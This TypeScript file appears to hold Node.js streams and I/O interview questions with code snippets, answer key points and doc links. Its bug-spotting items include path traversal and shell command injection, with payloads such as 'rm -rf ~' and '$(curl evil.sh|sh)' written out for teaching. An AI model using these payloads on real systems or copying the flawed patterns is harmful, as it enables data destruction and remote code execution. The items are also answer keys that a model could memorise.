import type { Question } from '../types';

const STREAM_DOCS = { label: 'Node.js docs — Stream', url: 'https://nodejs.org/api/stream.html' };
const BACKPRESSURE_GUIDE = {
  label: 'Node.js Learn — Backpressuring in Streams',
  url: 'https://nodejs.org/learn/modules/backpressuring-in-streams',
};
const HOW_TO_USE_STREAMS = {
  label: 'Node.js Learn — How to use streams',
  url: 'https://nodejs.org/learn/modules/how-to-use-streams',
};
const PIPELINE_DOCS = {
  label: 'Node.js docs — stream.pipeline()',
  url: 'https://nodejs.org/api/stream.html#streampipelinesource-transforms-destination-callback',
};
const DONT_BLOCK = {
  label: 'Node.js Learn — Don’t Block the Event Loop (or the Worker Pool)',
  url: 'https://nodejs.org/learn/asynchronous-work/dont-block-the-event-loop',
};

export const streamsIo: Question[] = [
  {
    id: 'st-why-streams',
    category: 'streams-io',
    level: 'junior',
    type: 'concept',
    prompt:
      'An endpoint serves a 2 GB video by reading the whole file into memory and then sending it. Why would streams be a better choice? Explain the benefits in terms of memory and time-to-first-byte.',
    keyPoints: [
      'Buffering the whole file costs ~2 GB of memory per concurrent request; a handful of simultaneous downloads exhausts the process (and fs.readFile refuses files over 2 GiB anyway).',
      'A stream moves data in small chunks (fs.createReadStream reads 64 KiB at a time by default), so memory stays roughly constant regardless of file size.',
      'Time-to-first-byte: the client starts receiving data as soon as the first chunk is read, instead of waiting until the whole file is loaded.',
      'Backpressure: a properly piped stream only reads from disk as fast as the (possibly slow) client can consume.',
      'Composability: chunks can flow through transforms (gzip, hashing, parsing) with pipeline(fs.createReadStream(path), res) and no intermediate buffers.',
      'Streams are everywhere in Node: HTTP req/res, sockets, process.stdin/stdout, child process stdio, zlib and crypto.',
    ],
    followUps: ['What happens if the client disconnects halfway through the download?'],
    sources: [HOW_TO_USE_STREAMS, STREAM_DOCS],
  },
  {
    id: 'st-stream-types',
    category: 'streams-io',
    level: 'junior',
    type: 'concept',
    prompt:
      'Name the four fundamental stream types in Node.js and give a real example of each. How is a Transform different from a plain Duplex?',
    keyPoints: [
      'Readable (a source you consume): fs.createReadStream, the request object on an HTTP server, process.stdin.',
      'Writable (a destination you write to): fs.createWriteStream, the HTTP response on a server, process.stdout.',
      'Duplex: both readable and writable, with two independent sides, e.g. net.Socket or a TLS socket (what you write is not what you read).',
      'Transform: a Duplex whose output is computed from its input, e.g. zlib.createGzip(), crypto ciphers, a CSV parser; PassThrough is the identity transform.',
      'All streams are EventEmitters (data, end, error, finish, close) and work on Buffers/strings by default or on arbitrary JS values in objectMode.',
      'Modern consumption: stream.pipeline() to connect them and for await...of to read a Readable.',
    ],
    sources: [
      { label: 'Node.js docs — Types of streams', url: 'https://nodejs.org/api/stream.html#types-of-streams' },
      HOW_TO_USE_STREAMS,
    ],
  },
  {
    id: 'st-readfilesync-handler',
    category: 'streams-io',
    level: 'junior',
    type: 'code',
    challenge: 'bad-practice',
    prompt: 'This works on your laptop. What problems will it cause in production, and how would you rewrite it?',
    codeLang: 'js',
    code: `import http from 'node:http';
import fs from 'node:fs';

http.createServer((req, res) => {
  if (req.url === '/report') {
    const data = fs.readFileSync('./reports/latest.json', 'utf8');
    res.setHeader('Content-Type', 'application/json');
    res.end(data);
  }
}).listen(3000);`,
    keyPoints: [
      'readFileSync blocks the single event-loop thread: while the disk read runs, no other request, timer or socket callback is processed, so latency rises for every user under load.',
      'fs has three API styles: synchronous (readFileSync, blocks), callback (fs.readFile(path, cb)) and promise-based (fs/promises readFile with await); the async ones run the I/O on the libuv threadpool.',
      'Sync calls are fine at startup (loading config) or in CLI scripts, never in a request path.',
      'If the file is missing, readFileSync throws inside the handler: an uncaught exception that crashes the whole server. With await + try/catch you return a 404/500 instead.',
      'Any other URL never gets a response (no else branch), so those requests hang until a timeout.',
      'Better: stream it with pipeline(fs.createReadStream(path), res), or cache the content in memory if it is small and rarely changes.',
    ],
    sources: [
      {
        label: 'Node.js Learn — Overview of Blocking vs Non-Blocking',
        url: 'https://nodejs.org/learn/asynchronous-work/overview-of-blocking-vs-non-blocking',
      },
      DONT_BLOCK,
      { label: 'Node.js docs — fs Synchronous API', url: 'https://nodejs.org/api/fs.html#synchronous-api' },
    ],
  },
  {
    id: 'st-pipe-leak',
    category: 'streams-io',
    level: 'mid',
    type: 'code',
    challenge: 'bug',
    prompt:
      'After a few days in production this endpoint starts failing with EMFILE (too many open files), and occasionally the whole process crashes. What is wrong and how do you fix it?',
    codeLang: 'js',
    code: `import fs from 'node:fs';
import zlib from 'node:zlib';

app.get('/logs/:name', (req, res) => {
  res.setHeader('Content-Encoding', 'gzip');
  fs.createReadStream(\`/var/log/app/\${req.params.name}\`)
    .pipe(zlib.createGzip())
    .pipe(res);
});`,
    keyPoints: [
      '.pipe() does not forward errors: if the read stream fails (ENOENT, EACCES) the error is emitted only on that stream, and with no error listener it becomes an uncaught exception that crashes the process.',
      '.pipe() does not destroy the other streams when one fails or closes: when a client disconnects mid-download, the source is just unpiped and left paused, keeping its file descriptor open. Leaked descriptors accumulate until EMFILE.',
      'Fix: use stream.pipeline (or await pipeline from node:stream/promises). It forwards errors, destroys every stream on failure or early close, and reports completion once.',
      'Handle the result: try { await pipeline(src, zlib.createGzip(), res) } catch (err) { if (!res.headersSent) res.status(404).end(); else res.destroy(err); }. Ideally open/stat the file first so a missing file becomes a clean 404 before headers are sent.',
      'Security bonus: req.params.name is decoded, so ..%2F..%2Fetc%2Fpasswd is a path traversal. Resolve the path and verify it stays inside the log directory, or use an allowlist.',
    ],
    followUps: ['How would you cancel the pipeline if the request is aborted?'],
    sources: [
      PIPELINE_DOCS,
      { label: 'Node.js docs — readable.pipe()', url: 'https://nodejs.org/api/stream.html#readablepipedestination-options' },
      { label: 'Node.js docs — Streams Promises API', url: 'https://nodejs.org/api/stream.html#streams-promises-api' },
    ],
  },
  {
    id: 'st-backpressure',
    category: 'streams-io',
    level: 'mid',
    type: 'code',
    challenge: 'bug',
    prompt:
      'This export script prints "done" almost instantly, then the process memory climbs to several GB and sometimes crashes with an out-of-memory error. Explain why and fix it.',
    codeLang: 'js',
    code: `import fs from 'node:fs';

const out = fs.createWriteStream('./export.csv');

for (let i = 0; i < 10_000_000; i++) {
  out.write(\`\${i},user-\${i},\${Date.now()}\\n\`);
}
out.end();
console.log('done');`,
    keyPoints: [
      'Backpressure is ignored: write() returns false once the internal buffer exceeds highWaterMark, signalling "stop until drain", but the loop keeps writing.',
      'The loop is synchronous, so nothing can be flushed to disk until it finishes; all 10 million lines are queued in memory first, hence the memory spike and possible OOM.',
      '"done" is logged before any data has been written: end() only schedules the end; completion is signalled by the finish event.',
      'Fix by hand: inside an async function, if (!out.write(line)) await once(out, \'drain\'); then end() and await once(out, \'finish\') (or finished()).',
      'Idiomatic fix: generate rows with a (async) generator and await pipeline(Readable.from(rows()), out); pipeline handles backpressure, errors and cleanup.',
      'highWaterMark is a threshold, not a hard cap: writes past it are still buffered, which is why respecting the return value matters.',
    ],
    sources: [
      BACKPRESSURE_GUIDE,
      { label: 'Node.js docs — writable.write()', url: 'https://nodejs.org/api/stream.html#writablewritechunk-encoding-callback' },
      { label: 'Node.js docs — Event: drain', url: 'https://nodejs.org/api/stream.html#event-drain' },
    ],
  },
  {
    id: 'st-utf8-split',
    category: 'streams-io',
    level: 'mid',
    type: 'code',
    challenge: 'output',
    prompt: 'What does this print? What real-world bug does it simulate, and how do you fix it?',
    codeLang: 'js',
    code: `import { Readable } from 'node:stream';

const bytes = Buffer.from('€10');
const chunks = [bytes.subarray(0, 2), bytes.subarray(2)];

let text = '';
const src = Readable.from(chunks, { objectMode: false });
src.on('data', (chunk) => { text += chunk; });
src.on('end', () => {
  console.log(bytes.length, text.length, text);
});`,
    keyPoints: [
      'It prints: 5 4 ��10 (two U+FFFD replacement characters instead of €).',
      '€ is 3 bytes in UTF-8 (e2 82 ac), so the string is 5 bytes; the chunk boundary splits the character into [e2 82] and [ac 31 30].',
      'text += chunk calls chunk.toString() on each chunk independently; an incomplete multi-byte sequence cannot be decoded and becomes U+FFFD, silently corrupting data. Real file and socket chunks split characters like this all the time.',
      'Fix: src.setEncoding(\'utf8\') (the stream then decodes with a StringDecoder that holds back incomplete characters), or use new StringDecoder(\'utf8\') with write()/end() yourself.',
      'Alternative for bounded data: collect Buffers and call Buffer.concat(chunks).toString() once at the end.',
      'Bytes and characters differ: Buffer.byteLength(str) vs str.length matters for Content-Length, size limits and maxBuffer.',
    ],
    sources: [
      { label: 'Node.js docs — String decoder', url: 'https://nodejs.org/api/string_decoder.html' },
      { label: 'Node.js docs — readable.setEncoding()', url: 'https://nodejs.org/api/stream.html#readablesetencodingencoding' },
      { label: 'Node.js docs — Buffers and character encodings', url: 'https://nodejs.org/api/buffer.html#buffers-and-character-encodings' },
    ],
  },
  {
    id: 'st-transform-lines',
    category: 'streams-io',
    level: 'mid',
    type: 'code',
    challenge: 'implement',
    prompt:
      'Implement LineSplitter: a Transform that receives arbitrary text chunks (from a file or socket) and emits exactly one complete line per output chunk. It must work when a line, or a multi-byte character, is split across chunks.',
    codeLang: 'js',
    code: `import fs from 'node:fs';
import { Transform } from 'node:stream';
import { pipeline } from 'node:stream/promises';

class LineSplitter extends Transform {
  // TODO
}

await pipeline(
  fs.createReadStream('big.csv'),
  new LineSplitter(),
  async function (lines) {
    for await (const line of lines) {
      // one complete line per iteration
    }
  },
);`,
    keyPoints: [
      'Constructor: super({ readableObjectMode: true }) so the readable side emits one string per line while the writable side still accepts Buffers; keep this.rest = \'\' and this.decoder = new StringDecoder(\'utf8\').',
      '_transform(chunk, encoding, callback): const text = this.rest + this.decoder.write(chunk); const lines = text.split(/\\r?\\n/); this.rest = lines.pop(); push each complete line; callback().',
      'The last element of split() may be a partial line, so it is carried over to the next chunk instead of being pushed.',
      '_flush(callback): append this.decoder.end(), push the remaining text if non-empty (a file may not end with a newline), then callback().',
      'Call callback exactly once per chunk and report failures with callback(err) so pipeline can tear everything down; guard against unbounded memory with a maximum line length.',
      'Alternatives worth naming: readline.createInterface over the stream, or an async generator stage in pipeline. Real CSV needs a proper parser because quoted fields may contain newlines.',
    ],
    sources: [
      { label: 'Node.js docs — Implementing a transform stream', url: 'https://nodejs.org/api/stream.html#implementing-a-transform-stream' },
      { label: 'Node.js docs — Object mode', url: 'https://nodejs.org/api/stream.html#object-mode' },
      { label: 'Node.js docs — String decoder', url: 'https://nodejs.org/api/string_decoder.html' },
    ],
  },
  {
    id: 'st-readline-count',
    category: 'streams-io',
    level: 'mid',
    type: 'code',
    challenge: 'implement',
    prompt:
      'Implement countErrors(path): count the lines containing "ERROR" in a 20 GB log file and return the first 5 matching lines, using constant memory.',
    codeLang: 'js',
    code: `import fs from 'node:fs';
import readline from 'node:readline';

export async function countErrors(path) {
  // TODO: return { count, sample } where sample holds the first 5 matching lines
}`,
    keyPoints: [
      'Wrap a read stream: const rl = readline.createInterface({ input: fs.createReadStream(path), crlfDelay: Infinity }); crlfDelay: Infinity treats \\r\\n as a single line break.',
      'Iterate with for await (const line of rl) { if (line.includes(\'ERROR\')) { count++; if (sample.length < 5) sample.push(line); } }; memory is bounded by the read buffer and the longest line.',
      'Never fs.readFile + split(\'\\n\'): readFile rejects files over 2 GiB (ERR_FS_FILE_TOO_LARGE) and the string plus array would not fit in the heap anyway.',
      'The docs state that input-stream errors are not forwarded to the readline async iterator: attach an error listener to the input stream (or check the file exists first) so a missing file does not hang or crash.',
      'Do not break out early if you need the full count; breaking closes the interface. For maximum throughput the line event API is faster than async iteration.',
    ],
    followUps: ['How would you parallelise this across CPU cores?'],
    sources: [
      {
        label: 'Node.js docs — readline: read file stream line by line',
        url: 'https://nodejs.org/api/readline.html#example-read-file-stream-line-by-line',
      },
      { label: 'Node.js docs — rl[Symbol.asyncIterator]()', url: 'https://nodejs.org/api/readline.html#rlsymbolasynciterator' },
      { label: 'Node.js docs — ERR_FS_FILE_TOO_LARGE', url: 'https://nodejs.org/api/errors.html#err_fs_file_too_large' },
    ],
  },
  {
    id: 'st-buffer',
    category: 'streams-io',
    level: 'mid',
    type: 'concept',
    prompt:
      'What is a Buffer in Node.js? Compare Buffer.alloc, Buffer.allocUnsafe and Buffer.from(string). When is allocUnsafe acceptable, and what is the risk?',
    keyPoints: [
      'A Buffer is a fixed-length sequence of raw bytes (a Uint8Array subclass) used for binary I/O: files, sockets, crypto. Its memory lives outside the JS heap.',
      'Buffer.alloc(size) returns zero-filled memory: safe, slightly slower.',
      'Buffer.allocUnsafe(size) skips initialisation: faster, but the memory may contain old data (secrets, other users’ payloads). Only acceptable when you overwrite every byte before reading or sending it; otherwise it is an information-disclosure bug.',
      'Small allocUnsafe/Buffer.from allocations (smaller than half of Buffer.poolSize, which defaults to 8 KiB) are sliced from a shared pre-allocated pool; alloc() never uses the pool.',
      'Buffer.from(string, encoding) encodes text (utf8 default; also hex, base64, base64url, latin1, utf16le). Byte length differs from string length: Buffer.byteLength(\'€\') is 3 but \'€\'.length is 1.',
      'subarray()/slice() share memory with the original (no copy), and a small slice keeps the whole parent allocation alive. new Buffer(n) is deprecated precisely because it returned uninitialised memory.',
    ],
    sources: [
      {
        label: 'Node.js docs — What makes Buffer.allocUnsafe() unsafe?',
        url: 'https://nodejs.org/api/buffer.html#what-makes-bufferallocunsafe-and-bufferallocunsafeslow-unsafe',
      },
      { label: 'Node.js docs — Buffer.from(string)', url: 'https://nodejs.org/api/buffer.html#static-method-bufferfromstring-encoding' },
    ],
  },
  {
    id: 'st-child-process',
    category: 'streams-io',
    level: 'mid',
    type: 'code',
    challenge: 'bug',
    prompt:
      'This endpoint generates a video thumbnail with ffmpeg. Identify the security problem and at least two other bugs, then explain when you would use spawn, exec, execFile and fork.',
    codeLang: 'js',
    code: `import { exec } from 'node:child_process';

app.get('/thumbnail', (req, res) => {
  const file = req.query.file;
  exec(\`ffmpeg -i uploads/\${file} -vframes 1 -f image2 -\`, (err, stdout) => {
    if (err) return res.status(500).send('failed');
    res.type('png').send(stdout);
  });
});`,
    keyPoints: [
      'Command injection: exec runs the string through a shell, so file=a.mp4;rm -rf ~ or $(curl evil.sh|sh) executes arbitrary commands.',
      'Fix: execFile or spawn with an argument array (no shell), validate/allowlist the filename and keep the resolved path inside uploads/; never pass user input with shell: true.',
      'exec buffers all stdout in memory up to maxBuffer (default 1024 * 1024 bytes); a larger image kills the child and errors.',
      'exec decodes stdout as a utf8 string by default, corrupting binary PNG data; use encoding: \'buffer\' or, better, spawn and pipe stdout straight to the response.',
      'spawn: no shell, streams stdio, best for large or long-running output. exec: shell + buffered, only for short trusted commands. execFile: like exec without a shell. fork: spawns a new Node process with an IPC channel (process.send).',
      'Also: set a timeout and kill the child when the client disconnects, handle the error event (e.g. ENOENT when ffmpeg is missing) and non-zero exit codes, and limit concurrency.',
    ],
    sources: [
      { label: 'Node.js docs — Child process', url: 'https://nodejs.org/api/child_process.html' },
      {
        label: 'OWASP — OS Command Injection Defense Cheat Sheet',
        url: 'https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html',
      },
    ],
  },
  {
    id: 'st-fs-watch',
    category: 'streams-io',
    level: 'mid',
    type: 'concept',
    prompt:
      'You are building a dev tool that reloads configuration when a file changes, using fs.watch. What caveats should you expect, and how would you make it reliable?',
    keyPoints: [
      'fs.watch depends on OS facilities (inotify, kqueue, FSEvents, ReadDirectoryChangesW), so behaviour differs by platform and can be unreliable or unavailable on network filesystems and on host mounts inside Docker/VMs.',
      'A single save often fires several events, or rename instead of change, because editors write a temp file and rename it. Debounce and re-read the file instead of trusting the event type.',
      'The filename argument is not guaranteed to be provided; code must handle null.',
      'On Linux and macOS the watch follows the inode: if the file is deleted and recreated you stop receiving events. Watching the parent directory avoids this.',
      'Fallbacks: fs.watchFile polls with stat (works more widely but is slower), or a library such as chokidar that normalises platform quirks. For restarting a dev server, node --watch exists.',
      'Watchers consume OS resources (on Linux, inotify watch limits); close them on shutdown.',
    ],
    sources: [
      { label: 'Node.js docs — fs.watch()', url: 'https://nodejs.org/api/fs.html#fswatchfilename-options-listener' },
      { label: 'Node.js docs — fs.watch caveats', url: 'https://nodejs.org/api/fs.html#caveats' },
      { label: 'chokidar (GitHub)', url: 'https://github.com/paulmillr/chokidar' },
    ],
  },
  {
    id: 'st-emfile',
    category: 'streams-io',
    level: 'senior',
    type: 'code',
    challenge: 'bad-practice',
    prompt:
      'This indexing job crashes with "EMFILE: too many open files" on large inputs, and while it runs, other parts of the same service (DNS lookups, password hashing) become very slow. Explain all the effects and redesign it.',
    codeLang: 'js',
    code: `import { readFile } from 'node:fs/promises';

// files: ~200,000 paths
export async function indexAll(files) {
  const docs = await Promise.all(
    files.map(async (file) => JSON.parse(await readFile(file, 'utf8'))),
  );
  return buildIndex(docs);
}`,
    keyPoints: [
      'Unbounded concurrency: all 200k reads start at once; each open file holds a descriptor until its read completes, and the process quickly exceeds its per-process limit (ulimit -n) → EMFILE.',
      'Async fs calls run on the libuv threadpool (4 threads by default, UV_THREADPOOL_SIZE). Flooding it starves other threadpool users in the same process, such as dns.lookup, crypto.pbkdf2/scrypt and zlib, which explains the slowdowns.',
      'Memory: every file’s contents and parsed document are held simultaneously. Promise.all also fails fast: one bad JSON rejects the batch while the other reads keep running in the background.',
      'Fix: bounded concurrency (p-limit or a small worker pool of e.g. 16–64), feed results into the index incrementally instead of collecting them, and handle per-file errors (try/catch or Promise.allSettled per batch).',
      'Raising ulimit or graceful-fs (which queues and retries on EMFILE) treats the symptom. Another common EMFILE source is leaking descriptors: FileHandles from fs.promises.open must be closed in finally.',
      'Diagnose with lsof -p <pid> or by counting /proc/<pid>/fd entries.',
    ],
    sources: [
      { label: 'Node.js docs — fs threadpool usage', url: 'https://nodejs.org/api/fs.html#threadpool-usage' },
      { label: 'Node.js docs — UV_THREADPOOL_SIZE', url: 'https://nodejs.org/api/cli.html#uv_threadpool_sizesize' },
      DONT_BLOCK,
      { label: 'p-limit (GitHub)', url: 'https://github.com/sindresorhus/p-limit' },
    ],
  },
  {
    id: 'st-readfile-5gb',
    category: 'streams-io',
    level: 'senior',
    type: 'concept',
    prompt:
      'A nightly job imports a CSV export into Postgres with (await readFile("export.csv", "utf8")).split("\\n"). The export has grown to 5 GB. What happens, and how would you redesign the import?',
    keyPoints: [
      'readFile rejects files larger than 2 GiB with ERR_FS_FILE_TOO_LARGE (an internal I/O limit). Even below that, the string plus the split array need several times the file size in heap, and V8 caps string length far below 5 GB, so the job would crash.',
      'Redesign as a streaming pipeline: fs.createReadStream → CSV parser in object mode (e.g. csv-parse, which handles quoted newlines) → batching stage → async writer that inserts each batch (multi-row INSERT or COPY via pg-copy-streams).',
      'Backpressure end to end: with await pipeline(...) and an async generator stage that awaits each DB write, reading pauses while Postgres is slow, so memory stays bounded.',
      'Object mode: chunks are JS values instead of bytes, and highWaterMark counts objects (default 16) rather than bytes.',
      'Robustness: load into a staging table inside a transaction and swap/merge at the end, idempotent upserts, checkpoints for resume, send invalid rows to a reject file instead of aborting, AbortSignal for cancellation, progress metrics.',
      'Parsing is CPU work on the main thread: fine in a dedicated job, but move it to a worker or separate process if it shares a process with an API.',
    ],
    sources: [
      { label: 'Node.js docs — ERR_FS_FILE_TOO_LARGE', url: 'https://nodejs.org/api/errors.html#err_fs_file_too_large' },
      { label: 'Node.js docs — Object mode', url: 'https://nodejs.org/api/stream.html#object-mode' },
      PIPELINE_DOCS,
      { label: 'csv-parse documentation', url: 'https://csv.js.org/parse/' },
    ],
  },
  {
    id: 'st-web-streams',
    category: 'streams-io',
    level: 'senior',
    type: 'concept',
    prompt:
      'Node now has two stream APIs: classic node:stream and WHATWG Web Streams (used by fetch). How do they relate? How would you download a large file with fetch and stream it to disk, or proxy it to an HTTP response, without buffering?',
    keyPoints: [
      'fetch() returns a Response whose body is a web ReadableStream of Uint8Array chunks, not a Node Readable; it has no .pipe() or .on(\'data\').',
      'Convert at the boundary: Readable.fromWeb(webStream) and Readable.toWeb(nodeReadable), plus Writable.fromWeb/toWeb and Duplex.toWeb; these were marked stable in Node 24.',
      'stream/promises pipeline also accepts web streams directly: await pipeline(res.body, fs.createWriteStream(path)). A web ReadableStream is also async iterable in Node.',
      'Check res.ok before streaming, and pass one AbortSignal to fetch and pipeline so a client disconnect cancels the upstream download.',
      'Always consume or cancel a fetch body you do not need: Node’s garbage collection is too lazy to release the pooled connection reliably, which can exhaust the pool.',
      'Why both exist: Web Streams are portable across browsers, Deno, Bun and edge runtimes (Request/Response, CompressionStream); Node streams are what most core APIs and libraries use. new Response(Readable.toWeb(fs.createReadStream(p))) bridges the other way.',
    ],
    sources: [
      { label: 'Node.js docs — Web Streams API', url: 'https://nodejs.org/api/webstreams.html' },
      {
        label: 'Node.js docs — stream.Readable.toWeb()',
        url: 'https://nodejs.org/api/stream.html#streamreadabletowebstreamreadable-options',
      },
      { label: 'undici README — Garbage Collection', url: 'https://github.com/nodejs/undici' },
      { label: 'MDN — Response.body', url: 'https://developer.mozilla.org/en-US/docs/Web/API/Response/body' },
    ],
  },
  {
    id: 'st-http-file-transfer',
    category: 'streams-io',
    level: 'senior',
    type: 'design',
    prompt:
      'Design an upload endpoint for files up to 5 GB and a download endpoint that can gzip text files on the fly. The Node service must never hold a whole file in memory. Walk through the implementation and the edge cases.',
    keyPoints: [
      'Upload: req is a Readable. Stream it through a multipart parser (busboy) and pipeline the file part straight to object storage (e.g. @aws-sdk/lib-storage Upload, which does S3 multipart) or to disk. Avoid memory-storage middleware that buffers everything.',
      'Enforce limits while streaming: reject early on Content-Length with 413, configure parser limits (fileSize, files, fields), count bytes and abort on overflow, and check file type by magic bytes rather than the client-supplied MIME type.',
      'Clean up on failure: a client abort or limit breach must destroy the pipeline and abort the multipart upload or delete the partial temp file. Raise server.requestTimeout (default 5 minutes) for this route or slow uploads will be cut off.',
      'Often better: hand out a presigned URL so the client uploads directly to S3; the Node service only authorises and records metadata. A single S3 PUT is limited to 5 GB, larger objects need multipart.',
      'Download: set Content-Type and Content-Disposition, then await pipeline(source, res); a slow client applies backpressure all the way to the disk/S3 read. Support Range requests (206) for resumable downloads and video seeking.',
      'Compression: if Accept-Encoding allows it, insert zlib.createGzip() (or Brotli), set Content-Encoding and Vary: Accept-Encoding, and drop Content-Length. Skip already-compressed formats; zlib uses the threadpool and CPU, so a CDN or reverse proxy is often a better place.',
    ],
    followUps: ['How do you scan uploads for malware without blocking the request?'],
    sources: [
      {
        label: 'Node.js docs — zlib: Compressing HTTP requests and responses',
        url: 'https://nodejs.org/api/zlib.html#compressing-http-requests-and-responses',
      },
      { label: 'busboy (GitHub)', url: 'https://github.com/mscdex/busboy' },
      { label: 'AWS — Uploading objects (size limits)', url: 'https://docs.aws.amazon.com/AmazonS3/latest/userguide/upload-objects.html' },
      { label: 'MDN — HTTP range requests', url: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Range_requests' },
    ],
  },
];
